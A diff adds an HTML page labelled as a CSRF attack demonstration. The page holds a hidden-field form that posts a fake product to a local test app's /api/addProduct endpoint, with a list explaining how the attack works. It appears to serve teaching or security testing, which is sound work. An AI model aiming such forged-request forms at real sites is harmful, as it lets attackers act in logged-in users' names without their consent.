@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>CSRF Attack Demonstration</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f7f7f7;
+      padding: 40px;
+      text-align: center;
+    }
+    .container {
+      background: #fff;
+      border: 2px solid #e74c3c;
+      border-radius: 8px;
+      max-width: 500px;
+      margin: auto;
+      padding: 30px;
+      box-shadow: 0 0 10px rgba(231, 76, 60, 0.2);
+    }
+    h1 {
+      color: #e74c3c;
+    }
+    .warning {
+      background-color: #ffe0e0;
+      border-left: 6px solid #e74c3c;
+      padding: 10px;
+      margin-bottom: 20px;
+      font-size: 14px;
+      color: #444;
+    }
+    .attack-details {
+      text-align: left;
+      margin-top: 20px;
+      background: #f0f0f0;
+      padding: 10px;
+      border-radius: 4px;
+      font-size: 13px;
+    }
+    input[type="submit"] {
+      padding: 10px 20px;
+      background: #e74c3c;
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background 0.3s;
+    }
+    input[type="submit"]:hover {
+      background: #c0392b;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>⚠️ CSRF Attack Demo</h1>
+    <div class="warning">
+      This form simulates a Cross-Site Request Forgery (CSRF) attack.<br />
+      When submitted, it sends a POST request to a vulnerable application without user consent.
+    </div>
+
+    <form action="http://localhost:3000/api/addProduct" method="POST">
+      <input type="hidden" name="name" value="CSRF_Hacked_Product" />
+      <input type="hidden" name="description" value="Injected from another site" />
+      <input type="hidden" name="catagory" value="Malicious" />
+      <input type="hidden" name="price" value="999" />
+      <input type="hidden" name="quantityInStock" value="100" />
+      <input type="hidden" name="supplierId" value="0" />
+      <input type="submit" value="Click here to trigger CSRF attack" />
+    </form>
+
+    <div class="attack-details">
+      <strong>What this form does:</strong>
+      <ul>
+        <li>Targets the endpoint: <code>/api/addProduct</code></li>
+        <li>Sends POST data without user confirmation</li>
+        <li>Relies on the victim being logged into the target app</li>
+        <li>If CSRF protection is missing, this product will be added to the database</li>
+      </ul>
+    </div>
+  </div>
+</body>
+</html>
